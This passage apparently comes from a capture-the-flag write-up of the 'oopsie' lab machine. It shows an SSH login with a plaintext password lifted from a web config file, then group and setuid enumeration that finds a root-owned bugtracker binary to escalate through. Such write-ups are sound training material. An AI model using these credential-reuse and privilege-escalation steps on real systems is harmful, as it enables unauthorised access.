Using plaintext credentials discovered in `/var/www/html/cdn-cgi/login/db.php`, the attacker can ssh as robert

- robert
-  M3g4C0rpUs3r!

```
robert@oopsie:~$ id
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)

robert@oopsie:~$ sudo -l
[sudo] password for robert: 
Sorry, user robert may not run sudo on oopsie.
```

## Investigating bugtracker group
```
robert@oopsie:~$ getent group bugtracker
bugtracker:x:1001:robert

robert@oopsie:~$ find / -group bugtracker 2>/dev/null
/usr/bin/bugtracker

robert@oopsie:~$ ls -l /usr/bin/bugtracker 
-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
```
The setuid bit means the bugtracker binary will run as root.